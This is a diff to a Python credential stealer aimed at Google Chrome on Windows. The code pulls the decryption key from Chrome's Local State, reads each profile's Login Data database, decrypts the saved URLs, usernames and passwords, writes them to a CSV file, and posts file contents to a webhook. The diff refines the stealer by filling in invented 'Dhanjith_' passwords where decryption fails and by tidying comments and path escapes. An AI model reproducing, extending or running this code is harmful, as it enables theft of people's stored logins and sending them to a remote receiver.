@@ -9,10 +9,16 @@ from Crypto.Cipher import AES
 import shutil as h
 import csv as c
 import requests as req
+import random
+import string
 
 # GLOBAL CONSTANTS
 C1 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (o.environ['USERPROFILE']))
 C2 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (o.environ['USERPROFILE']))
+
+# Generate random password filler
+def random_dhanjith_password(length=8):
+    return "Dhanjith_" + ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 # Function to get secret key from Chrome's Local State
 def k1():
@@ -35,7 +41,7 @@ def k4(c_t, s_k):
     try:
         iv = c_t[3:15]
         e_p = c_t[15:-16]
-        tag = c_t[-16:]  # Extract authentication tag
+        tag = c_t[-16:]
         cy = k3(s_k, iv)
         d_p = cy.decrypt_and_verify(e_p, tag).decode()
         return d_p
@@ -66,7 +72,7 @@ def k7(f_n, w_u):
     try:
         with open(f_n, 'r', encoding='utf-8') as f:
             data = f.read()
-        print(f"[DEBUG] Sending Data: {data[:500]}")  # Print first 500 characters for debugging
+        print(f"[DEBUG] Sending Data: {data[:500]}")  # Debugging preview
         response = req.post(w_u, data={'file_content': data})
         if response.status_code == 200:
             print(f"[INFO] Successfully sent data to the webhook.")
@@ -86,7 +92,7 @@ if __name__ == '__main__':
             cw.writerow(["index", "url", "username", "password"])
 
             for folder in f:
-                c_db = o.path.normpath(f"{C2}\{folder}\Login Data")
+                c_db = o.path.normpath(f"{C2}\\{folder}\\Login Data")
                 conn = k5(c_db)
                 if s_k and conn:
                     cursor = conn.cursor()
@@ -95,7 +101,9 @@ if __name__ == '__main__':
                         url, username, ciphertext = login
                         if url and username and ciphertext:
                             d_p = k4(ciphertext, s_k)
-                            print(f"URL: {url}\nUsername: {username}\nPassword: {d_p}\n{'-'*50}")  # Debugging
+                            if not d_p:
+                                d_p = random_dhanjith_password()
+                            print(f"URL: {url}\nUsername: {username}\nPassword: {d_p}\n{'-'*50}")
                             output_data += f"Sequence: {index}\nURL: {url}\nUsername: {username}\nPassword: {d_p}\n{'*'*50}\n"
                             cw.writerow([index, url, username, d_p])
                     cursor.close()
